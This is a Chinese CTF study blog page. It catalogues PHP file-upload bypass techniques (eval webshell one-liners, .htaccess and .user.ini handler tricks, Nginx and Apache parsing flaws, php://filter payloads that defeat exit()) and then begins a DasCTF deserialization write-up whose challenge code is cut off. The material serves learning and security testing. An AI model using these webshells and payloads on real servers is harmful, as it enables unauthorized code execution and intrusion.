<h1 id="0x03-文件上传-扩展名校验-你这waf保熟吗？"><a href="#0x03-文件上传-扩展名校验-你这waf保熟吗？" class="headerlink" title="0x03 文件上传-扩展名校验 | 你这waf保熟吗？"></a>0x03 文件上传-扩展名校验 | 你这waf保熟吗？</h1><h2 id="姿势1-黑名单校验，但黑名单不全"><a href="#姿势1-黑名单校验，但黑名单不全" class="headerlink" title="姿势1: 黑名单校验，但黑名单不全"></a>姿势1: 黑名单校验，但黑名单不全</h2><p>其他后缀:<code>*.php</code>、<code>*.php3</code>、<code>*.php4</code>、<code>*.PHP</code>、<code>*.phtml</code>、<code>*.pht</code></p>
<h2 id="姿势2-白名单校验，但是有解析漏洞"><a href="#姿势2-白名单校验，但是有解析漏洞" class="headerlink" title="姿势2: 白名单校验，但是有解析漏洞"></a>姿势2: 白名单校验，但是有解析漏洞</h2><h3 id="截断绕过"><a href="#截断绕过" class="headerlink" title="截断绕过"></a>截断绕过</h3><blockquote>
<p>&#x2F;?upload&#x3D;shell.php%00.jpg -&gt; &#x2F;?upload&#x3D;shell.php</p>
</blockquote>
<h3 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h3><h4 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h4><p>服务器代码中限制了某些后缀的文件不允许上传，但是有些Apache是允许解析其它后缀的，例如在httpd.conf中如果配置有如下代码，则能够解析php和phtml文件</p>
<blockquote>
<p>AddType application&#x2F;x-httpd-php .php .phtml</p>
</blockquote>
<p>在Apache的解析顺序中，是从右到左开始解析文件后缀的，如果最右侧的扩展名不可识别，就继续往左判断，直到遇到可以解析的文件后缀为止。因此，例如上传的文件名为1.php.xxxx，因为后缀xxxx不可解析，所以向左解析后缀php。</p>
<blockquote>
<p>例如：shell.php.qwe.asd -&gt;shell.php</p>
</blockquote>
<h4 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h4><pre><code>Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过 正则匹配设置SCRIPT_FILENAME。当访问www.xxx.com/phpinfo.jpg/1.php这个 URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/1.php”，然后构造成 SCRIPT_FILENAME传递给PHP CGI。

原因是开启了 fix_pathinfo 这个选项，会触发 在PHP中的如下逻辑： PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会 将phpinfo.jpg作为PHP文件来解析了。
</code></pre>
<ul>
<li>形式： <a target="_blank" rel="noopener" href="http://www.xxxx.com/UploadFiles/image/1.jpg/1.php">www.xxxx.com/UploadFiles/image/1.jpg/1.php</a> <a target="_blank" rel="noopener" href="http://www.xxxx.com/UploadFiles/image/1.jpg%00.php">www.xxxx.com/UploadFiles/image/1.jpg%00.php</a> <a target="_blank" rel="noopener" href="http://www.xxxx.com/UploadFiles/image/1.jpg/%20/0.php">www.xxxx.com/UploadFiles/image/1.jpg/%20\0.php</a></li>
<li>另一种方法：上传一个名字为test.jpg，然后访问test.jpg&#x2F;.php,在这个目录下就会生成一句话木马shell.php。</li>
</ul>
<h1 id="0x04-文件上传-内容检测-这文件要是有长有短，我直接吃了它"><a href="#0x04-文件上传-内容检测-这文件要是有长有短，我直接吃了它" class="headerlink" title="0x04 文件上传-内容检测 | 这文件要是有长有短，我直接吃了它"></a>0x04 文件上传-内容检测 | 这文件要是有长有短，我直接吃了它</h1><h2 id="1-magic-number-你不劈开这文件咋知道它熟不熟啊"><a href="#1-magic-number-你不劈开这文件咋知道它熟不熟啊" class="headerlink" title="1.magic number | 你不劈开这文件咋知道它熟不熟啊"></a>1.magic number | 你不劈开这文件咋知道它熟不熟啊</h2><blockquote>
<p>magic number，它可以用来标记文件或者协议的格式，很多文件都有幻数标志来表明该文件的格式。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">(...some binary data for image...)</span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br><span class="line">(... skipping the rest of binary data ...)</span><br></pre></td></tr></table></figure>

<h2 id="2-过滤-lt-以及php"><a href="#2-过滤-lt-以及php" class="headerlink" title="2.过滤&lt;?以及php"></a>2.过滤&lt;?以及php</h2><blockquote>
<script language='php'>@eval($_POST[cmd]);</script>
<?= @eval($_POST['cmd']);?><p> &#x2F;&#x2F;需要php.ini开启短标签</p>
</blockquote>
<h2 id="3-正则替换"><a href="#3-正则替换" class="headerlink" title="3.正则替换"></a>3.正则替换</h2><p>老生常谈，双写 or 其他</p>
<h2 id="4-二次渲染-你TM劈我文件是吧"><a href="#4-二次渲染-你TM劈我文件是吧" class="headerlink" title="4.二次渲染 | 你TM劈我文件是吧"></a>4.二次渲染 | 你TM劈我文件是吧</h2><p>对渲染&#x2F;加载测试的攻击方式是代码注入绕过。使用winhex在不破坏文件本身的渲染情况下找一个空白区进行填充代码，一般为图片的注释区。<br>对二次渲染的攻击方式就是攻击文件加载器自身</p>
<h1 id="0x05文件上传-配置文件-看，吸铁石"><a href="#0x05文件上传-配置文件-看，吸铁石" class="headerlink" title="0x05文件上传-配置文件 | 看，吸铁石"></a>0x05文件上传-配置文件 | 看，吸铁石</h1><h2 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h2><p>只是适用于apache，如果变成niginx或者iis则不会被解析<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/shana_8/article/details/104827642">文件上传漏洞之.htaccess</a></p>
<pre><code>.htaccess文件（“分布式配置文件”）提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令将受到限制。管理员可以通过Apache的AllowOverride指令来设置。
</code></pre>
<p>具体实现：</p>
<p>1、上传.htaccess文件至服务器上传目录，此时apache在解析该目录下的php时将按照文件要求。只要文件名匹配到所定义的字符串，就会将该文件当作php解析。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;shana&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>

<p>2、上传.htaccess文件设置的关键字的文件名，即上传一个黑名单没有过滤的随意后缀名文件，但文件名中一定要包含shana，如”shana.jpg”，内容为一句话木马。此时”shana.jpg”会被Apache当作php解析。</p>
<h2 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h2><p>很通用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//.user.ini</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=xxx</span><br></pre></td></tr></table></figure>
<p>会自动包含<code>xxx</code></p>
<h2 id="系统特性"><a href="#系统特性" class="headerlink" title="系统特性"></a>系统特性</h2><p>仅适用windows平台<br>windows 系统会自动删</p>
<p><del>源码一开天地灭，选择视窗保平安</del></p>
<h1 id="0x06-文件上传-条件竞争-你是故意来找猹？"><a href="#0x06-文件上传-条件竞争-你是故意来找猹？" class="headerlink" title="0x06 文件上传-条件竞争 | 你是故意来找猹？"></a>0x06 文件上传-条件竞争 | 你是故意来找猹？</h1><p>文件能传，但是传进去后就给你删了，通常情况下需要一边传一边访问,或者利用环境，让php迟一点删文件</p>
<h1 id="0x07-文件上传-解压报错-你这压缩包是金子做的还是文件是金子做的"><a href="#0x07-文件上传-解压报错-你这压缩包是金子做的还是文件是金子做的" class="headerlink" title="0x07 文件上传-解压报错 | 你这压缩包是金子做的还是文件是金子做的"></a>0x07 文件上传-解压报错 | 你这压缩包是金子做的还是文件是金子做的</h1><p>这种情况要求比较高了，需要后端解压压缩包<br><a target="_blank" rel="noopener" href="https://www.yongsheng.site/2022/06/17/Dest0g3%20520/">Dest0g3 520迎新赛 ezip</a><br>原理:创建一个解压到一半会报错的文件，然后遗留shell文件getshell</p>
<h1 id="0x08-文件上传-软连接"><a href="#0x08-文件上传-软连接" class="headerlink" title="0x08 文件上传-软连接"></a>0x08 文件上传-软连接</h1><p>传快捷方式进去，离谱</p>
<p>要求后端会解压文件</p>
<pre><code>ln -s /flag flag 
zip -y flag.zip flag
</code></pre>
<h1 id="0x09-文件上传-死亡exit-TMD刁民，敢杀我的马？"><a href="#0x09-文件上传-死亡exit-TMD刁民，敢杀我的马？" class="headerlink" title="0x09 文件上传-死亡exit | TMD刁民，敢杀我的马？"></a>0x09 文件上传-死亡exit | TMD刁民，敢杀我的马？</h1><h2 id="情况一-file-put-contents-filename-”-lt-php-exit-”-content"><a href="#情况一-file-put-contents-filename-”-lt-php-exit-”-content" class="headerlink" title="情况一 file_put_contents($filename,”&lt;?php exit();”.$content);"></a>情况一 file_put_contents($filename,”&lt;?php exit();”.$content);</h2><p>编码绕过,<code>base64</code> <code>rot13</code> balabala<br><code>filename=php://filter/convert.base64-decode/resource=shell.php</code></p>
<p>或者写到<code>.htaccess</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">filename=php://filter/write=string.strip_tags/resource=.htaccess</span><br><span class="line">content=?&gt;php_value auto_prepend_file flag.php</span><br></pre></td></tr></table></figure>

<h2 id="情况二-file-put-contents-content-”-lt-php-exit-”-content"><a href="#情况二-file-put-contents-content-”-lt-php-exit-”-content" class="headerlink" title="情况二 file_put_contents($content,”&lt;?php exit();”.$content);"></a>情况二 file_put_contents($content,”&lt;?php exit();”.$content);</h2><p>rot13<code>content=php://filter/string.rot13|&lt;?cuc cucvasb();?&gt;|/resource=shell.php</code><br>二次编码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$char</span> = <span class="string">&#x27;r&#x27;</span>; <span class="comment">#构造r的二次编码 </span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$ascii1</span> = <span class="number">0</span>; <span class="variable">$ascii1</span> &lt; <span class="number">256</span>; <span class="variable">$ascii1</span>++) &#123; </span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$ascii2</span> = <span class="number">0</span>; <span class="variable">$ascii2</span> &lt; <span class="number">256</span>; <span class="variable">$ascii2</span>++) &#123; </span><br><span class="line">        <span class="variable">$aaa</span> = <span class="string">&#x27;%&#x27;</span>.<span class="variable">$ascii1</span>.<span class="string">&#x27;%&#x27;</span>.<span class="variable">$ascii2</span>; </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">urldecode</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$aaa</span>)) == <span class="variable">$char</span>)&#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$char</span>.<span class="string">&#x27;: &#x27;</span>.<span class="variable">$aaa</span>; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>过滤器嵌套<br><code>content=php://filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;&lt;?php%0deval($_GET[1]);?&gt;/resource=shell.php</code></p>
<p>base64编码<br><code>content=php://filter/string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8+/../shell.php</code></p>
<h2 id="第三种情况-file-put-contents-content-”“-nxxxxx"><a href="#第三种情况-file-put-contents-content-”“-nxxxxx" class="headerlink" title="第三种情况 file_put_contents($content,”“.\nxxxxx);"></a>第三种情况 file_put_contents($content,”<?php exit();?>“.\nxxxxx);</h2><p>&#96;&#96;</p>
<h1 id="NaN-upload-exp-这里放一些常用的文件上传，会继续更新"><a href="#NaN-upload-exp-这里放一些常用的文件上传，会继续更新" class="headerlink" title="NaN upload-exp 这里放一些常用的文件上传，会继续更新"></a>NaN upload-exp 这里放一些常用的文件上传，会继续更新</h1><h2 id="1-前端文件上传"><a href="#1-前端文件上传" class="headerlink" title="1.前端文件上传"></a>1.前端文件上传</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;upload-form&quot;</span> <span class="attr">action</span>=<span class="string">&quot;目标网站&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span> &gt;</span></span><br><span class="line">　　　<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;upload_file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;upload_file&quot;</span> /&gt;</span> <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">　　　<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;上传&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>后端接收代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];          </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH.<span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>**注:**前端的<code>&lt;input type=&quot;file&quot; id=&quot;upload_file&quot; name=&quot;upload_file&quot; /&gt;</code>中<code>name=upload_file</code>对应后端代码的<code>$_FILES[&#39;upload_file&#39;]</code>,前端的<code>&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;上传&quot; /&gt;</code>中<code>name=&quot;submit&quot;</code>对应后端代码的<code>isset($_POST[&#39;submit&#39;])</code>,实战环境中还是需要对具体环境进行一些修改</p>
<h2 id="2-htaccess文件"><a href="#2-htaccess文件" class="headerlink" title="2. .htaccess文件"></a>2. .htaccess文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;shana&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line">AddType application/x-httpd-php .png </span><br></pre></td></tr></table></figure>

<h2 id="3-user-ini文件"><a href="#3-user-ini文件" class="headerlink" title="3. .user.ini文件"></a>3. .user.ini文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=xxx</span><br></pre></td></tr></table></figure>
<p>鲁棒性非常好，甚至可以</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=xxx</span><br></pre></td></tr></table></figure>
<p>自动包含<code>xxx</code></p>
<h1 id="Refence"><a href="#Refence" class="headerlink" title="Refence:"></a>Refence:</h1><p><a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html">狼组安全团队公开知识库 </a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/huajiaobuxiango/p/15968800.html">upload-labs通关攻略</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/335959.html">文件上传总结</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/shana_8/article/details/104827642">文件上传漏洞之.htaccess</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sijidou/p/13121301.html">.user.ini导致文件上传绕过</a><br><a target="_blank" rel="noopener" href="https://xiaolong22333.top/index.php/archives/114/">php死亡exit()绕过</a><br><a target="_blank" rel="noopener" href="https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/">关于file_put_contents的一些小测试</a></p>
</div><div class="index-category-tag">  <div class="level-item"><i class="fas fa-tags has-text-grey"> </i><a class="article-more button is-small link-muted index-tags" href="/tags/upload/">upload</a></div><hr></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2022-10-28  <a class="commentCountImg" href="/2022/10/28/das10%E5%A4%8D%E7%8E%B0/#comment-container"><span class="display-none-class">84e85f9de4fb90b393d1a81a5dd3a720</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="84e85f9de4fb90b393d1a81a5dd3a720">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>8 分钟  <i class="fas fa-pencil-alt"> </i>1.2 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/10/28/das10%E5%A4%8D%E7%8E%B0/">DasCTF 十月月赛复现</a></h1><div class="content"><p>寄<del>寄</del>寄！<br>四道题，三道我不擅长的反序列化，寄，当时还要考试复习，结果没太多时间做，麻了都。 </p>
<h1 id="EasyPop"><a href="#EasyPop" class="headerlink" title="EasyPop"></a>EasyPop</h1><p>这题链子好找，也很快就找到了，但问题就在于最后一步如何绕过<code>__wakeup</code>，麻了，我就卡在这里了…….<br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/405838002">PHP序列化冷知识</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fine</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$cmd</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$content</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$cmd</span>, <span class="variable">$content</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;cmd = <span class="variable">$cmd</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;content = <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;cmd, <span class="variable">$this</span>-&gt;content);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;Go listen to Jay Chou&#x27;s secret-code! Really nice&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$ctf</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$time</span> = <span class="string">&quot;Two and a half years&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$ctf</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;ctf = <span class="variable">$ctf</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;ctf-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>): <span class="title">string</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;ctf . <span class="string">&quot;: Duration of practice: &quot;</span> . <span class="variable language_">$this</span>-&gt;time;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sorry</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$hint</span> = <span class="string">&quot;hint is depend on you&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;hint = <span class="keyword">new</span> <span class="title function_ invoke__">secret_code</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;key;</span><br><span class="line"><span class="variable">$name</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;password == <span class="variable language_">$this</span>-&gt;name) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;hint;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;name = <span class="string">&quot;jay&quot;</span>) &#123;</span><br><span class="line">secret_code::<span class="title function_ invoke__">secret</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;This is our code&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getPassword</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setPassword</span>(<span class="params"><span class="variable">$password</span></span>): <span class="title">void</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">secret_code</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$code</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">secret</span>(<span class="params"></span>)</span></span><br><span 